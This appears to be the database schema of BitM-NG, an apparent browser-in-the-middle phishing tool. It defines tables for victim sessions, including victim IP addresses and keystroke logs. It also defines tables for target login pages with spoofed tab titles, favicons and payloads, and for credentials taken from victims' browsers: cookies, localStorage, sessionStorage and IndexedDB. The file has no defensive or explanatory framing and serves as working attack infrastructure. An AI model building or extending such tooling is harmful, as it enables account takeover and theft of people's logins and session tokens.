-- Database schema for BitM-NG
-- Supports both SQLite and PostgreSQL

-- Sessions table
CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  browser_id TEXT NOT NULL,
  victim_socket_id TEXT NOT NULL,
  admin_socket_id TEXT,
  victim_ip TEXT NOT NULL,
  user_agent TEXT NOT NULL,
  viewport_width INTEGER NOT NULL,
  viewport_height INTEGER NOT NULL,
  status TEXT NOT NULL DEFAULT 'active',
  keylog TEXT DEFAULT '',
  metadata TEXT DEFAULT '{}',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Targets table (for storing target configurations)
CREATE TABLE IF NOT EXISTS targets (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL UNIQUE,
  login_page TEXT NOT NULL,
  boot_location TEXT NOT NULL,
  tab_title TEXT,
  favicon TEXT,
  payload TEXT,
  wait_for_selector TEXT,
  screenshot_on_login BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Credentials table (for storing extracted credentials)
CREATE TABLE IF NOT EXISTS credentials (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL,
  browser_id TEXT NOT NULL,
  cookies TEXT DEFAULT '[]',
  local_storage TEXT DEFAULT '{}',
  session_storage TEXT DEFAULT '{}',
  indexed_db TEXT,
  url TEXT NOT NULL,
  extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (session_id) REFERENCES sessions(id) ON DELETE CASCADE
);

-- Indexes for better query performance
CREATE INDEX IF NOT EXISTS idx_sessions_browser_id ON sessions(browser_id);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status);
CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON sessions(created_at);
CREATE INDEX IF NOT EXISTS idx_credentials_session_id ON credentials(session_id);
CREATE INDEX IF NOT EXISTS idx_credentials_browser_id ON credentials(browser_id);

